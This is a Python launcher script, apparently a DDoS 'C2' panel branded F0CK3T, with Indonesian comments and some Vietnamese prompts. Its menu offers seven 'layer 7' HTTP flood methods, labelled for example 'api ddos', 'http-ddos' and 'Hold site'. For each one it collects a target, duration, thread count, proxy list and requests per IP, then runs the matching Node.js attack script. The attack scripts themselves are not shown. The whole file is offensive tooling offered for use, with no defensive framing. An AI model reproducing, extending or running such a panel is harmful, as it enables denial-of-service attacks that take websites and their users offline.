# yang di kembangkan oleh Focket <3
import subprocess
import os
from os import name, system

if name == 'nt':
    system("title F0CK3T - HTTP BROWSER")
    system("mode 101, 30")

# untuk melakukan run script nodejs
def run_script(script_name, args):
    command = ['node', script_name] + args
    subprocess.run(command)

# daptar menu extrax froxy
def count_proxy(proxy_file):
    with open(proxy_file, 'r') as file:
        proxies = file.readlines()
    # daptar menu proxyfile
    proxies = [proxy.strip() for proxy in proxies if proxy.strip()]
    return len(proxies)

# tampilan menu untuk script
def show_menu():
    os.system("cls" if os.name == "nt" else "clear")
    print()
    print("                     WELCOME TO C2 ")
    print("")
    print(" |$$$$$  |$$$$$$$$ |$$$$$$  |$$    $$$  |$$$$$$$$ |$$$$$$$$$$")
    print(" |$$     |$$    $$ |$$      |$$  $$$    |$$           |$$")
    print(" |$$     |$$    $$ |$$      |$$$$$      |$$           |$$")
    print(" |$$$$%  |$$    $$ |$$      |$$$$$      |$$$$$$$$     |$$")
    print(" |$$     |$$    $$ |$$      |$$  $$$    |$$           |$$")
    print(" |$$     |$$    $$ |$$      |$$   $$$   |$$           |$$")
    print(" |$$     |$$$$$$$$ |$$$$$$$ |$$     $$$ |$$$$$$$$     |$$")
    print()
    print("============= Method layer 7 ============")
    print("  ==> VVIP")
    print("  [1] - Bypass    [api ddos]")
    print("  [2] - Hold      [basic]")
    print("  [3] - skibidi   [http-ddos]")
    print("  [4] - TLS       [Hold site]")
    print("  [5] - Nemesis   [basic]")
    print("  [6] - Pluto     [power full]")
    print("  [7] - Rapid     [Hold site]")
    print("  [0] - EXIT")
    print("=========================================")

# tampilan menu untuk attack
def handle_menu_selection(selection):
    if selection == '1':
        print("\n============== Bypass ==============")
        target = input("  masukan target: ")
        time = input("  masukan time: ")
        thread = input("  masukan thread: ")
        proxy_file = input("  masukan file proxy: ")
        requests = input("  masukan requests per IP: ")
        mode = input("  masukan mode : ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("============== Bypass ==============")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print(f"  Requests per IP: {requests}")
        print(f"  Mode: {mode}")
        print("=========================================")
        input("   tekan (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  daptar proxy: {proxy_count}")
        run_script('Bypass.js', [target, time, thread, proxy_file, requests, mode,])

    elif selection == '2':
        print("\n================= Hold ================")
        target = input("  masukan target: ")
        time = input("  masukan time: ")
        requests = input("  masukan requests per IP: ")
        thread = input("  masukan thread: ")
        proxy_file = input("  masukan file proxy: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("=============== Hold ==============")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Requests per IP: {requests}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print("=========================================")
        input("  tekan (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  daptar proxy: {proxy_count}")
        run_script('Hold.js', [target, time, requests, thread, proxy_file,])

    elif selection == '3':
        print("\n================= skibidi =================")
        target = input("  masukan target: ")
        time = input("  masukan time: ")
        requests = input("  masukan requests per IP: ")
        thread = input("  masukan thread: ")
        proxy_file = input("  masukan file proxy: ")
        mode = input("  masukan mode: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================= skibidi =================")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Requests per IP: {requests}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print(f"  Mode: {mode}")
        print("=========================================")
        input("  tekan (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  daptar proxy: {proxy_count}")
        run_script('skibidi.js', [target, time, requests, thread, proxy_file, mode])

    elif selection == '4':
        print("\n================= TLS ================")
        target = input("  masukan target: ")
        time = input("  masukan time: ")
        requests = input("  masukan requests per IP: ")
        thread = input("  masukan thread: ")
        proxy_file = input("  masukan file proxy: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================= TLS ================")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Requests per IP: {requests}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print("=========================================")
        input("  tekan (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  daptar proxy: {proxy_count}")
        run_script('TLS.js', [target, time, requests, thread, proxy_file])

    elif selection == '5':
        print("\n================== Nemesis ==================")
        target = input("  masukan target: ")
        time = input("  masukan time: ")
        requests = input("  masukan requests per IP: ")
        thread = input("  masukan thread: ")
        proxy_file = input("  masukan file proxy: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================== Nemesis ==================")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Requests per IP: {requests}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print("=========================================")
        input("  tekan (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  daptar proxy: {proxy_count}")
        run_script('Nemesis.js', [target, time, requests, thread, proxy_file,])

    elif selection == '6':
        print("\n=============== Pluto ==============")
        target = input("  masukan target: ")
        time = input("  masukan time: ")
        requests = input("  masukan requests per IP: ")
        thread = input("  masukan thread: ")
        proxy_file = input("  masukan file proxy: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("=============== Pluto ==============")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Requests per IP: {requests}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print("=========================================")
        input("  tekaan (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  daptar proxy: {proxy_count}")
        run_script('Pluto.js', [target, time, requests, thread, proxy_file])

    elif selection == '7':
        print("\n================ Rapid ===============")
        target = input("  masukan target: ")
        time = input("  masukan time: ")
        requests = input("  masukan requests per IP: ")
        thread = input("  masukan thread: ")
        proxy_file = input("  masukan file proxy: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================ Rapid ================")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Requests per IP: {requests}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print("==========================================")
        input("  tekan (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  daptar proxy: {proxy_count}")
        run_script('Rapid.js', [target, time, requests, thread, proxy_file])

    else:
        print("  Lựa chọn không hợp lệ.")

# Focket panel
def start_panel():
    while True:
        show_menu()
        selection = input("  Nhập lựa chọn của bạn (0-7): ")
        
        if selection == '0':
            break
        
        if selection not in ['1', '2', '3', '4', '5', '6', '7']:
            print("  Lựa chọn không hợp lệ. Vui lòng chọn lại.")
            continue
        
        handle_menu_selection(selection)

# Focket panel
start_panel()

# https://github.com/llolyppop
